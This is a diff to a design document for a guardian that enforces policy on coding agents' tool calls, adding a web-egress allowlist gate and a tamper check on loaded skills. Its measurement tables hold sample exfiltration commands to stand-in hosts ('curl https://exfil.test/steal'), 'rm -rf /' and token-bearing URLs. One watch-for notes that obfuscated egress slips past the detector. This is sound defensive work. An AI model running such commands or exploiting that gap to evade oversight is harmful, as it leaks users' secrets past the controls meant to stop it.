@@ -22,8 +22,10 @@ Every slice ends in something demo-able.
 | V6 | Session state and provenance carriage | C4 | "The SessionContext chain grows per step. AGT emits `result_labels` at one step and gets them back as `input.ifc.source_labels` at the next, carried in the `IfcLabels` field of the ACS provenance record." |
 | V7 | Conformance matrix | C1, C2, C5 | "Eight intervention points by five AGT verdicts, every cell resolved — `expressed` where ACS v0.1.0 expresses AGT, `guardian_only` where only process-local Guardian knowledge can, `unexpressed` with a named reason where it cannot. Plus the Trace pillar, measured as an explicit non-claim." |
 | V8 | Upstream contract watch | C6 | "Point the harness at AGT `main`. A changed enum value is reported as a `SurfaceDiff` naming the surface and the field that moved." |
+| V9 | A second tool shape, and the egress gate | C7, C9 | "Ask for a web fetch of a host the allowlist does not cover. AGT's stock `egress` gate denies it — a fourth gate class live, from one `data.json` key and no code. Then ask for the same destination over `curl`, and it denies again, this time from a Guardian-extracted destination. Both verdicts come from the same unforked rule." |
+| V10 | A hook AGT has no host for | C8 | "Load a skill whose bytes changed since it was approved. AGT's stock `content_hash` gate denies it, driven by `steps/skillLoad` — an ACS hook no AGT host package implements, deciding through AGT's own unforked bundle." |
 
-**Order rationale.** V1–V4 establish credibility on the host AGT already supports best, so the second-host claim in V5 lands against a working baseline rather than a promise. V7 is the deliverable Microsoft reads, but its cells can only be *resolved* once V1–V6 exist to be measured — never "green", which is the success name §V7 retracted and which this line had gone on carrying. V8 is what keeps V7 true after upstream moves.
+**Order rationale.** V1–V4 establish credibility on the host AGT already supports best, so the second-host claim in V5 lands against a working baseline rather than a promise. V7 is the deliverable Microsoft reads, but its cells can only be *resolved* once V1–V6 exist to be measured — never "green", which is the success name §V7 retracted and which this line had gone on carrying. V8 is what keeps V7 true after upstream moves. **V9 and V10 come after V8 rather than beside V4**, though neither depends on the upstream watch: both change what the conformance matrix measures, and a matrix that moves while it is being published is worse than one published late. V9 precedes V10 because V10's snapshot needs V9's normalised policy target — a skill-load snapshot has no `command` argument either, and would hit the same `runtime_error:path_missing` wall.
 
 ---
 
@@ -597,7 +599,167 @@ Runs on a schedule in CI. MS-ACS is `0.3.1-beta` and warns of breaking changes b
 
 **⚠️ What this slice confirms, and what it does not — the demo sentence invites a stronger reading than it can carry.** Upstream movement cannot break the running implementation: `agent-control-specification` is pinned at exactly `0.3.1-beta.0` (no caret), `agt.lock` pins the ref, and `verify:pin` proves `policy/lib` is byte-identical to it, so nothing on `main` reaches this repository until a human bumps the pin. Forward compatibility is bought by pinning, not by watching. What upstream movement *does* break is the truth of the published claim — V7's matrix asserts ACS v0.1.0 expresses AGT at 40 coordinates, measured against a ref that quietly becomes historical, and a confidently wrong table is this slice's real subject.
 
+**⚠️ V9 planning found a second `tools`-adjacent hazard on the seam this section already watches, and V9 closes it because V9 is what makes it reachable.** The row below rules that a hookmap `tools` entry naming a string the host never dispatches silently governs nothing. Its neighbour is the *opposite* asymmetry, in `mapping.yaml` rather than a hookmap: `pre_tool_call.modifications.into_argument` is the literal `command`, applied to every tool regardless of what that tool's arguments are called. Today it cannot misfire, because `^Bash$` is the only matcher and `command` is the only argument. V9 widens the matcher, and at that moment a `transform` on a `WebFetch` call is emitted as `parameter_overrides.command` — a key the tool has no argument for — while `url`, still carrying whatever AGT redacted, is delivered untouched. **Measured through the shipped `mapVerdict`**, not reasoned about, and recorded in `spike-unreached-gates.md` §A7. Unlike the six posture-seam faults and the `tools` row, this one is *created* by V9's own widening, so it is V9's to close and not a residual: N54 makes the target argument and the override argument one declaration read twice.
+
 **R2.5 asks for more than a surface diff, and V8 delivers part of it.** The requirement says a moved surface "shows up as a failing case rather than silent rot" — that is a re-measurement, not a textual comparison. The reachable half is re-asking V7's own question of `main`: validating the policy input the Guardian would send against `main`'s `policy-input.schema.json`, which fails rather than diffs. The unreachable half is re-running the whole coverage matrix against `main`, because that evaluates through the AGT **Node SDK** and the SDK at `main` is not published to npm — it would have to be built from source on every scheduled run. **That gap is a slice of its own and is not V8's**; V8's declaration states the boundary in these words so no reader takes the watch for a compatibility guarantee.
+
+---
+
+## V9: A second tool shape, and the egress gate
+
+**Demo:** Ask for a web fetch of a host the allowlist does not cover. AGT's stock `egress` gate denies it — a fourth gate class live, from one `data.json` key and no code. Then ask for the same destination over `curl`, and it denies again, this time from a Guardian-extracted destination. Both verdicts come from the same unforked rule.
+
+Every measurement in this section is in `docs/shaping/spike-unreached-gates.md`, taken against the pinned bundle through the shipped assembler and the shipped `mapVerdict` rather than read out of AGT's documentation.
+
+| # | Place | Component | Affordance | Control | Wires Out | Returns To |
+|---|-------|-----------|------------|---------|-----------|------------|
+| N54 | P3 | guardian | `resolvePolicyTargetArgument(toolName, mapping, point)` — the per-tool argument name, one declaration read twice | call | → N23, → N24 | — |
+| N55 | P3 | guardian | `annotateEgressDestination()` — reads `raw_command`, answers `{destination}` for `input.annotations.egress` | call | → N30 | — |
+| N23 | P3 | guardian | `assemblePreToolCallSnapshot()` — gains the normalised policy-target leaf and forwards `raw_command` | call | → N30 | — |
+| N24 | P3 | guardian | `mapVerdict()` — `into_argument` resolved through N54 instead of read as a literal | call | → N25, → N26 | → N4, → N13 |
+| S10 | shared | store | `mapping.yaml` — gains the per-tool policy-target argument table | — | — | → N54 |
+| S8 | P3.1 | store | `data.agt.defaults.config` — gains `egress` | — | — | → N30 |
+| S7 | P3.1 | store | `policy/manifest.yaml` — gains the fetch tool per host, and an `annotators: egress` block | — | — | → N31 |
+| S1 | P1 | store | `claude-code.hookmap.yaml` — declares `raw_command` | — | — | → N2 |
+| S2 | P2 | store | `opencode.hookmap.yaml` — declares `raw_command` | — | — | → N11 |
+
+**This slice's affordances are N54, N55, N23, N24, S10, S8, S7, S1, S2.** No new UI: the denial renders through U2 and U11 (each host's own decision surface) and through U20/U21 in the Inspector, exactly as every other verdict class has since V3. A slice that ends in demo-able UI does not have to end in *new* UI, and inventing a surface for the fourth gate class when the first three share one would be the wrong kind of vertical.
+
+### What is config, and what is code
+
+The demo's first half is the strongest form of R2.1 available, and it is worth being precise about why. `egress.rego` declares its own destination paths, and the **first** is `["snapshot", "tool_call", "args", "url"]`. `assemblePreToolCallSnapshot` already unwraps every ACS `arguments.<k>.value` into `tool_call.args.<k>`. So for a tool whose ACS arguments name a `url`, the wire and the gate already agree, and nothing translates between them.
+
+Measured, with one `data.json` key and one manifest `tools:` entry:
+
+| Envelope | Verdict |
+|---|---|
+| `arguments.url.value = "https://docs.anthropic.com/x"` | `allow`, `result_labels: ["public"]` |
+| `arguments.url.value = "https://exfil.attacker.test/steal"` | `deny` `egress_destination_not_allowed` |
+
+Zero code, zero Rego, `verify:pin` untouched. **The code in this slice is not what makes egress work** — it is what makes a *second tool shape* work at all, and what covers the shell case the first half cannot.
+
+### C9: why a second tool needs code before it needs policy
+
+AGT's `manifest.schema.json` defines `intervention_point` with `additionalProperties: false` and exactly one `policy_target`. One manifest, one point, one path — no per-tool variation. `policy/manifest.yaml` declares `$.tool_call.args.command`, and AGT resolves it *before any rule runs*.
+
+Measured: a benign `WebFetch` call under that target is denied with `runtime_error:path_missing`, message *"Request blocked by Agent Control Specification."* Not evaluated and allowed — **denied, on a missing path, with no rule consulted.**
+
+This has never bitten because `.claude/settings.json` and `hosts/claude-code/settings.json` both match `^Bash$`. The deployment governs exactly one tool, whose argument is named `command`, which is why one literal has been able to stand in for a table.
+
+So the normalised leaf: `mapping.yaml` names, per intervention point, which argument each tool's policy target is read from, N23 writes it to one fixed snapshot leaf, and the manifest keeps its single `policy_target` pointed at that leaf. Every gate stays live in one Guardian, which is the property a second manifest per gate would have cost.
+
+**⚠️ The leaf is shared with `patterns` and `redact`, and that had to be measured rather than assumed.** Both fall back to `input.policy_target.value` — `pattern_text()` explicitly, `redact_verdict` directly. A URL landing there is evaluated by rules written for shell commands. Measured across all four live gates on one manifest:
+
+| Call | Verdict |
+|---|---|
+| `Bash`, `echo hi` | `allow` |
+| `Bash`, `rm -rf /` | `deny` `destructive_shell_command_blocked` |
+| `WebFetch`, allowlisted host | `allow` |
+| `WebFetch`, off-allowlist host | `deny` `egress_destination_not_allowed` |
+| `WebFetch`, url carrying `ghp_…` | `transform` → `…?t=[REDACTED]` |
+| `Bash`, command carrying `ghp_…` | `transform` → `echo [REDACTED]` |
+
+No false positive in either direction: the destructive-shell patterns do not match URLs, and the egress gate does not match commands. **The AGT layer is sound under a shared leaf.**
+
+**⚠️ The ACS layer is not, and this is the defect the slice exists to close.** `mapping.yaml`'s `into_argument: command` is a literal. Run row five's verdict through the shipped `mapVerdict`:
+
+```json
+{ "decision": "modify",
+  "modifications": { "parameter_overrides": { "command": "https://docs.anthropic.com/?t=[REDACTED]" } } }
+```
+
+The redaction is emitted against an argument `WebFetch` does not have, and `url` — still carrying the token — is delivered untouched. A modification reported applied while the original ships: the same family as risk rows 15 and 17, reached from a third direction. **N54 is the answer, and its shape is the point**: the argument the target is read *from* and the argument an override is written *to* are one declaration read twice, because two declarations would be two things that can disagree. `test/path-dialects.test.ts` today derives `into_argument` from the manifest's `policy_target`; under a normalised leaf that derivation yields the leaf's own name, which is no host's argument, so the check changes with it rather than being deleted.
+
+**One consequence small enough to lose and wrong enough to matter:** `mapping.yaml`'s `summaries.redaction_applied.pre_tool_call` reads *"A secret in this **command** was replaced before it ran."* Under a shared leaf that sentence is wrong for every non-shell tool, and it is the sentence a model reads.
+
+### C7.2: the half that costs a claim
+
+The `url` route covers `WebFetch` and covers nothing else. Exfiltration is `curl https://evil.test/x`, and that destination lives inside `raw_command` — an ACS v0.1.0 field this repository types in `validate-envelope.ts:100`, no hookmap declares, and no assembler forwards. `capability` beside it is the same story at line 98, and its own spec description offers `network.egress` as a worked example.
+
+Forwarding `raw_command` is not enough on its own: `egress.rego`'s `host_of()` splits on `://` and `/`, so handed `curl https://evil.test/x` it answers `curl https`. Extraction is a real step. It lands in N55 and reaches policy at `input.annotations.egress.destination` — `egress.rego`'s **own fifth default path**, which is to say AGT anticipated exactly this seam and declared the address for it.
+
+Measured, with the dispatcher supplied:
+
+| Call | Verdict |
+|---|---|
+| `echo hi` | `allow` — no destination found, gate `undefined`, falls through |
+| `curl https://exfil.test/steal` | `deny` `egress_destination_not_allowed` |
+| `curl https://docs.anthropic.com/x` | `allow` |
+
+**The cost is a claim, and V7's matrix records it rather than hiding it.** The destination is Guardian-originated, so the cell is `guardian_only` — the status R1.3's `annotations` and R1.4's identity already carry — where C7.1's cell is `expressed`. Two colours for one gate is the honest result, and it is why both halves ship instead of one.
+
+**⚠️ Watch-for: a command the extractor cannot parse is not denied, it is unexamined.** The gate is `undefined` when no destination resolves, so an obfuscated or novel egress form falls through to `allow`. This is the failure direction to state plainly in the runbook, because the demo's shape invites the opposite reading.
+
+**⚠️ Watch-for: an annotator the Guardian dispatches nothing for denies every call.** Measured — one manifest declaring `annotators: egress: {type: classifier}`, evaluated by a bridge built without a dispatcher, answered `deny runtime_error:annotation_failed` (*"egress: missing required field 'url'"*) for `echo hi` as readily as for a `curl`. Not a no-op: a **total deny wearing a runtime-error reason**, which reads like a policy decision. This is why `policy/manifest.drift.yaml` is a sibling file rather than a block in the main manifest, and V9 takes the other road — one manifest, with `startGuardian` supplying the dispatcher unconditionally. The seam already exists (`CreateBridgeOptions.annotator`); what changes is that it stops being optional. A test asserting a benign call is not denied under the shipped manifest is the backstop, and it is the one test in this slice whose absence would be silent.
+
+**⚠️ Watch-for: `egress` must carry an explicit `allowlist`.** With the key absent, `allowlist(rules)` falls back to `input.tool.security_labels` — `["shell"]` on every tool `policy/manifest.yaml` registers — and every destination is denied. `policy/manifest.yaml`'s own `bash` comment anticipated the coupling ("carried only so `bash` behaves like `Bash` the moment `cfg.egress` ever gets configured") but not this direction of it. First recorded in the spike's residual; it becomes V9's the moment V9 sets the key.
+
+### What V9 does not claim
+
+Widening the matcher governs the tools named in it and no others. Claude Code dispatches many more, and each new one is a `tools:` registration plus a `mapping.yaml` row — additive, but not automatic, and not something this slice's demo should be read as having done. The `runtime_error:tool_unknown` wall that made `Bash` and `bash` both necessary is unchanged and is what fails an unregistered tool closed.
+
+---
+
+## V10: A hook AGT has no host for
+
+**Demo:** Load a skill whose bytes changed since it was approved. AGT's stock `content_hash` gate denies it, driven by `steps/skillLoad` — an ACS hook no AGT host package implements, deciding through AGT's own unforked bundle.
+
+This is R8.3 answered by building it, and R8.4's whole subject. It is also the first slice where the headroom argument is *run* rather than shown, which is the sequencing the frame asks for: completeness first, headroom at the end.
+
+| # | Place | Component | Affordance | Control | Wires Out | Returns To |
+|---|-------|-----------|------------|---------|-----------|------------|
+| N56 | P3 | guardian | `assembleSkillLoadSnapshot()` — a third sibling beside V1's and V4's: `tool_call.name` ← `skill_id`, `tool_call.content_hash` ← `digest.value` | call | → N30 | — |
+| N21 | P3 | guardian | `validateEnvelope()` — gains `hooks/skill-load.json` | call | → N22, → N27 | — |
+| N28 | P3 | guardian | `buildServerHello()` — `methods_evaluated` gains `steps/skillLoad` | call | → N26 | → N5, → N14 |
+| S10 | shared | store | `mapping.yaml` — a row binding `steps/skillLoad` to an AGT intervention point | — | — | → N23, → N24 |
+| S8 | P3.1 | store | `data.agt.defaults.config` — gains `content_hash.enforce` | — | — | → N30 |
+| S7 | P3.1 | store | `policy/manifest.yaml` — the approved digest, on the skill's own `tools:` entry | — | — | → N31 |
+
+**This slice's affordances are N56, N21, N28, S10, S8, S7.**
+
+### Why this gate is reachable at all
+
+Two facts, both measured, neither obvious from reading AGT.
+
+**AGT's `$defs/tool` is `additionalProperties: true`,** so a manifest tool entry may declare a `content_hash` — legal rather than merely tolerated. And the SDK carries it through: reading AGT's own `policyInput` back out of the bridge's evidence path, `input.tool` came back as `{"content_hash":"sha-256:APPROVED","id":"code-reviewer","type":"Tool","name":"code-reviewer"}`.
+
+With `config.content_hash.enforce: true` and the observed hash placed at `snapshot.tool_call.content_hash`, all three stock behaviours fire:
+
+| Observed | Verdict |
+|---|---|
+| matches the declared | `allow` |
+| differs | `deny` `tool_content_hash_mismatch` — *"declared sha-256:APPROVED but observed sha-256:POISONED"* |
+| absent | `deny` `tool_content_hash_mismatch` — *"manifest declared tool.content_hash but snapshot.tool_call.content_hash was missing"* |
+
+The gate needs exactly one thing from this side: a `snapshot.tool_call.content_hash`. ACS supplies it.
+
+### The two documents were written independently about the same threat
+
+`hooks/skill-load.json` requires `digest {algorithm, value}` and says what a Guardian is to do with it:
+
+> The Guardian compares it against the digest it approved at `steps/skillRegister`; a mismatch means the artifact changed between registration and load (tamper or swap).
+>
+> A load the Guardian cannot tie to an approved registration, or whose digest differs from the approved one, is unverifiable and SHOULD be denied.
+
+That is, clause for clause, what `content_hash.rego` decides — mismatch denies, and declared-but-unobserved denies. Neither document cites the other.
+
+**⚠️ The subject differs, and the slice must say so rather than let the demo imply otherwise.** AGT's gate is about a **tool**; ACS v0.1.0 puts the integrity digest on a **skill**. The AgBOM makes the split explicit rather than incidental: `skill_fields.definition` is required to carry `{ref, digest}` and is described as *"the surface attackers poison"*, while `tool_fields` requires only `capability`. So this is not one field living at a different address — it is the same control applied to a different component class, and the published claim is "AGT's rule decides an ACS-native subject", never "ACS carries AGT's tool hash".
+
+### The limit, stated in the slice rather than discovered in the demo
+
+**⚠️ The approved digest is manifest-static, and it cannot be otherwise from this side.** `content_hash.rego` reads the declared hash from `input.tool.content_hash` and nowhere else. `input.tool` is resolved by the SDK from the manifest's `tools:` catalog, keyed by `tool_call.name`. There is no config hook — no `declared_paths` counterpart to `egress`'s `destination_paths` — and annotations are not consulted.
+
+So a digest a Guardian approved at `steps/skillRegister` **cannot reach this gate through session state.** V10 declares the approved digest in the manifest and says so plainly. The register→load binding ACS actually specifies — persist `(skill_id, digest)` at registration, check the pair at load — is a Guardian-side control that AGT has no part in, and V10 does not build it. Closing the gap the other way would mean AGT accepting a declared hash from the snapshot, which weakens AGT's own trust model; that is an upstream conversation, not a slice.
+
+**⚠️ V10 depends on V9 and cannot be reordered.** A skill-load snapshot has no `command` argument, so under the pre-V9 manifest it hits `runtime_error:path_missing` before `content_hash` is consulted — the identical wall V9 measured for `WebFetch`. The normalised policy-target leaf is the dependency, not the egress gate.
+
+### Which hooks this implementation instruments, and which it does not
+
+D3 is closed by this slice, so the number belongs here — and the denominator has to be stated with it, because two correct counts are in circulation. `hooks/` holds 29 files: seven are `.acs-provenance` profile variants of a sibling, leaving **22 hook payload schemas**, of which **19 are `steps/*`** and three are not (`agbom/snapshot`, `agbom/changed`, `system/ping`). R5.4 asks which `steps/*` hooks are instrumented, so **19 is this row's denominator**, and it is the figure V1 planning established by counting the schemas on disk against `specification.md` §5's stale table of 16.
+
+This implementation instruments **three of the nineteen**: `steps/toolCallRequest`, `steps/toolCallResult`, `steps/skillLoad`. The other sixteen are not implemented, and most are not named in `mapping.yaml` either — that table declares AGT's eight intervention points against the ACS methods they map to, which is six `steps/*` methods and two nulls, so it was never a coverage statement about ACS's surface. What speaks to a conformant client is `buildServerHello`'s `methods_evaluated`: a method omitted there tells the client, in `handshake.json`'s own words, to treat that gate as ALLOW-by-default.
+
+Three of nineteen is the honest figure, and it is the frame this slice's headroom claim has to sit inside: the argument is not that ACS's surface is covered, it is that one of its uncovered hooks already drives an unforked AGT rule.
 
 ---
 
@@ -653,12 +815,18 @@ Not repaired in V5 because every one predates this slice, none is reachable thro
 | 17 | ⚠️ On OpenCode, `tool.execute.after`'s `metadata` carries **its own copy of the output**, so a redaction that patches only the leaf leaves the plaintext in the host's session record | V5, V7 | The slice's central hazard, and it **inverts V4's central safety property**: V4 withholds by cloning the host's own object so every sibling survives, which is exactly right where siblings are unrelated fields and exactly wrong where one mirrors the leaf. Measured — the model received `[REDACTED]` (zero copies in the `message` table) while the persisted part kept `metadata.output: "TOKEN=ghp_ONLYINOUTPUT999\n"`, with nothing malformed and nothing warning. Handled structurally: S2 declares `outputs.mirrors` and `replacingOutput` patches every one, under the same three guards the leaf patch has — a mirror naming a field the tool never produced, or one whose type the replacement does not match, is refused rather than written, because a replacement of a shape the host declines delivers the original. **⚠️ The post-condition beside it was redesigned during V5 execution, and the first design broke the *shipped* host.** It asked whether the withheld value survived anywhere in the replacement — which conflates "holds the same value" with "is a copy of the leaf", and nothing in a payload distinguishes them. Claude Code's `tool_response` carries `stdout` and `stderr`, both `""` for any command that prints nothing, so `stderr` read as an undeclared mirror and **every silent command became a blocking stop with no audit entry** — `touch`, `mkdir`, `git add`. Measured end to end through the shim; invisible to the suite because no test fed an empty output at the result gate. What ships instead is two questions: every **declared** mirror received the replacement, and — **only for a hookmap that declares mirrors at all** — no other field still holds the original. A host declaring none has said it has no duplicate-carrying siblings, so the scan never runs for it. **⚠️ That gating narrows the root error; it does not remove it, and saying otherwise would be the third unmeasured claim this branch has had to retract.** The second question is still the same "holds the same value ⇒ is a copy of the leaf" inference — so on a host that *does* declare mirrors, an unrelated sibling coincidentally equal to the leaf is refused, at the preflight, as a blocking stop with no audit entry. That is the exact failure that broke host #1, surviving for host #2 — the subject of this slice. Measured at both ends and pinned as a deliberate over-refusal. Two further limits, stated because they are easy to assume away: the scan walks only the clone of `outputs.within`, so a duplicate the host keeps **outside** that container is invisible however it is declared; and an undeclared mirror on a host that declares **none** is not detectable at all. All three are the hookmap author's to get right, and V7's matrix carries the cells |
 | 18 | ⚠️ On OpenCode, a result-gate `deny` expressed as a **throw** withholds from the model but cannot scrub that copy | V5, V7 | Measured both ways: the plugin's own view of `metadata.output` was `[WITHHELD]` at the moment of the throw, and the record kept the plaintext — OpenCode discards the plugin's mutations on the throw path and rebuilds `metadata` from its own pre-hook copy (the rebuilt object had also lost `exit` and `truncated`, which is what proves it is a different object). So deny at this gate **withholds by replacing**, never by throwing. The same conclusion §V4 reached on Claude Code — a result-gate deny goes *through* the modify mechanism — arrived at from the opposite host mechanism, which is worth stating because the two hosts fail in mirror-image ways: Claude Code's `block` reports a withholding while delivering the output, OpenCode's throw withholds the output while keeping it on disk |
 
+| 19 | ⚠️ Widening the tool matcher turns `mapping.yaml`'s `into_argument: command` from harmless into a redaction delivered against the wrong argument | V9 | The defect V9 creates and V9 closes. Measured through the shipped `mapVerdict`: an AGT `transform` on a `WebFetch` call is emitted as `parameter_overrides.command`, a key the tool has no argument for, while `url` — carrying whatever AGT redacted — is delivered untouched. Not a pre-existing residual: under `^Bash$` there is exactly one tool and exactly one argument name, so the literal has never been able to misfire. Handled structurally by N54 rather than by care — the argument the policy target is read *from* and the argument an override is written *to* are one `mapping.yaml` entry read twice, so they cannot disagree. Same family as rows 15 and 17, reached from a third direction |
+| 20 | ⚠️ An annotator declared in a manifest the Guardian dispatches nothing for is a **total deny**, not a no-op | V9 | Measured: a manifest carrying `annotators: egress: {type: classifier}`, evaluated by a bridge built without a dispatcher, answers `deny runtime_error:annotation_failed` for `echo hi` as readily as for a `curl`. This is the hazard `policy/manifest.drift.yaml` avoided by being a sibling file. V9 takes the other road — one manifest, `startGuardian` supplying the dispatcher unconditionally — because C9's whole point is every gate live in one Guardian. The seam already exists (`CreateBridgeOptions.annotator`); what changes is that it stops being optional. Backstopped by a test asserting a benign call is not denied under the shipped manifest, which is the one test in the slice whose absence would be silent |
+| 21 | ⚠️ `cfg.egress` without an explicit `allowlist` denies every destination | V9 | `allowlist(rules)` falls back to `input.tool.security_labels`, which is `["shell"]` on every tool `policy/manifest.yaml` registers. An operator turning the gate on with a bare `egress: {}` gets a total-deny that reads like a policy decision. `policy/manifest.yaml`'s own `bash` comment anticipated the coupling but not this direction of it. Accepted and pinned by a test rather than engineered around: the fallback is AGT's, and `policy/lib` is byte-identical upstream |
+| 22 | ⚠️ An egress destination the extractor cannot parse falls through to `allow`, not to `deny` | V9, V7 | Structural, and stated rather than fixed. `egress.rego`'s gate is `undefined` when no destination resolves, so an obfuscated or novel egress form is unexamined rather than blocked. C7.2 is a detector, and a detector's misses are allows. The runbook says so in the slice's own voice, because the demo's shape invites the opposite reading, and V7's matrix carries the cell as `guardian_only` for exactly this reason |
+| 23 | ⚠️ V10's approved digest is manifest-static, so the register→load binding ACS specifies is not the binding AGT checks | V10, V7 | Not closable from this side: `content_hash.rego` reads the declared hash from `input.tool` alone, which the SDK resolves from the manifest's `tools:` catalog — no config hook, no annotations. A digest approved at `steps/skillLoad`'s own `steps/skillRegister` cannot reach the gate through session state. V10 declares the digest in the manifest and says so; the `(skill_id, digest)` binding is a Guardian-side ACS control V10 does not build. Closing it upstream would mean AGT accepting a declared hash from the snapshot, which weakens AGT's trust model — an upstream conversation, not a slice |
+
 ## Open decisions carried from shaping
 
 | # | Decision | Blocks |
 |---|----------|--------|
 | ~~D1~~ | ✅ **Closed: confirmed, OpenCode is host #2.** Resolved during V5 planning by running OpenCode **1.18.15**, not by reading it. Its plugin API expresses both gates: modify by mutating the object each hook is handed, deny by throwing at the request gate and by replacing at the result gate. ⚠️ *This row said "against an unchanged adapter", which is what planning believed and what execution disproved — the adapter gained two hookmap fields, four load-time gates, a normalising `loadHookmap`, and the `tools` rule both shims share. (It also named a count of changed files; that count went stale in the review round that followed and is gone rather than re-measured.) The claim that survives is stronger and is R3.4's actual subject: **no per-host fork.** Every line landed in `packages/host-adapter/src`, the package both hosts run, and host #1's own source is +0/−0.* Two conditions attach, both new watch-fors in §V5 and risk rows 17/18 — `metadata` mirrors the output leaf, and a throw cannot scrub that mirror. R3.6 moves from 🟡 *leaning yes* to confirmed | ~~V5~~ |
-| D3 | Hook coverage beyond AGT's eight | V7 scope |
+| ~~D3~~ | ✅ **Closed: three `steps/*` hooks of nineteen, and the third earns its place by driving an AGT rule.** `steps/toolCallRequest` and `steps/toolCallResult` through V8; `steps/skillLoad` added by V10 because `hooks/skill-load.json`'s own text is `content_hash.rego`'s decision clause for clause, and no AGT host package has a hook for it. Coverage beyond AGT's eight points was always going to be a spec exercise unless a hook did real policy work — this one does. ⚠️ *V9/V10 planning briefly restated the denominator as 22 and called V1's 19 stale. It is not: 22 is every hook payload schema, 19 is the `steps/*` subset, and R5.4 asks about `steps/*`. V1's figure stands and §V10 now carries both counts with the three non-`steps` schemas named* | ~~V7~~, V10 |
 | D4 | Spec `steps/modelCall` for v0.2 as part of this work | V7 red cells |
 | D5 | Determinism of the demo | V1 onward |
 | ~~D7~~ | ✅ **Closed: Rego.** Cedar's sole advantage was avoiding an external binary; the SDK bundles OPA, so that advantage does not exist. Stock bundle verified 105/105 under the bundled OPA | ~~V1~~ |
@@ -676,5 +844,9 @@ V2 planning produced no corrections — §V2 had nothing wrong in it — but it 
 **V5 planning produced six corrections, closed F2 and closed D1**, each recorded at the row it governs in §V5, and each verified by running OpenCode **1.18.15** rather than reading its documentation — driven by a local deterministic model endpoint, so the tool path is genuine and the measurement costs nothing. In order of consequence: `tool.execute.after`'s `metadata` carries **its own copy of the output**, which inverts V4's clone-every-sibling discipline from the property that makes a redaction safe into the one that leaks it; a result-gate `deny` expressed as a **throw** withholds from the model but cannot scrub that copy, because OpenCode discards the plugin's mutations on the throw path — so deny there withholds by replacing, which is §V4's conclusion reached from the opposite mechanism; risk row 2 was **backwards**, since modify is the straightforward half on this host and deny is the half with no field at all; `N10` named two hooks that do not exist (`session.start`, `tool.execute.error`); `exit_status` is a real field here rather than V4's hookmap literal, which makes that gap Claude Code's rather than ACS's; and `modifications.modified_content` has an obvious target at OpenCode's result gate, because its output is an opaque string — the exact case §V4 predicted would have one, so V7's matrix carries the cell as red for one host and green for the other rather than red outright. Three of the six are notes about **this host** or about **V7's matrix**, never about AGT. Its plan is `docs/superpowers/plans/2026-08-12-v5-second-host.md`.
 
 **V5 execution produced a seventh correction, and it falsifies a claim V4, V5's plan and this document all repeated** — that the parked landing check was "one check" closing both holes. Building it showed a per-target comparison passes all three of V4's recorded bundles, because each one's declared targets genuinely change; the plan's own test had used a no-op fixture and so never met the case V4 measured. The holes are two questions — **value** at the request gate, **observability** at the result gate — and they are closed by two checks in the two files that respectively can and cannot know which target is the projected leaf. Recorded at §V4's parked item and §V5's inherited-scope note. Worth stating as its own entry because the claim survived three documents and a planning round unchallenged: it was repeated, never re-measured, and only building it caught it.
+
+**V9/V10 planning produced five corrections, closed D3 and R5.4, and answered R8.3 by building it** — every one measured against the pinned bundle through the shipped assembler and the shipped `mapVerdict`, never read out of AGT's documentation. Its spike is `docs/shaping/spike-unreached-gates.md`. In order of consequence: the manifest's single `policy_target` **denies a benign call on `runtime_error:path_missing`** for any tool without a `command` argument, so governing a second tool shape is code before it is policy, and AGT's `intervention_point` being `additionalProperties: false` is what forecloses the easy answer; `mapping.yaml`'s `into_argument: command` is a **literal**, so the moment the matcher widens a redaction is emitted against an argument the tool does not have while the original ships — the third arrival of rows 15 and 17's family; a manifest declaring an annotator the Guardian dispatches nothing for is a **total deny**, benign calls included, which is the unstated reason `manifest.drift.yaml` is a sibling file; AGT's `$defs/tool` is `additionalProperties: true` and the SDK carries an extra key through to `input.tool`, which is the whole reason `content_hash` is reachable at all; and `cfg.egress` without an explicit `allowlist` falls back to `input.tool.security_labels` and denies everything.
+
+**Two of the five invert claims this project had already made in conversation**, which is why they are listed rather than folded into the slice sections. Egress had been described as a mapping problem needing an extraction step: measured, `egress.rego`'s **first** default destination path is `snapshot.tool_call.args.url` and `assemblePreToolCallSnapshot` already lands there, so for a `url`-bearing tool it is one `data.json` key with no code and no Rego — the strongest form of R2.1 in the project, and it had been filed as work. And `content_hash` had been described as a field ACS carries at a different address: measured, ACS puts the integrity digest on a **skill** and AGT's gate is about a **tool**, with the AgBOM making the split explicit (`skill_fields.definition` required and named "the surface attackers poison"; `tool_fields` requiring only `capability`). Same control, different component class — a weaker claim than "different address", and the one V10 has to publish.
 
 **V2's whole-branch review produced one correction of its own**, recorded at the watch-for it governs: "S6 records the wire verbatim" over-claimed byte identity that the implementation never had, and the over-claim had propagated verbatim from the plan's global constraint 11 into the slice README, the runbook, the shaping doc's S6 row, and the Inspector's renderer. Corrected in wording, not in code — see the watch-for above for why storing raw bytes would be the worse trade. The same review added risk row 10.
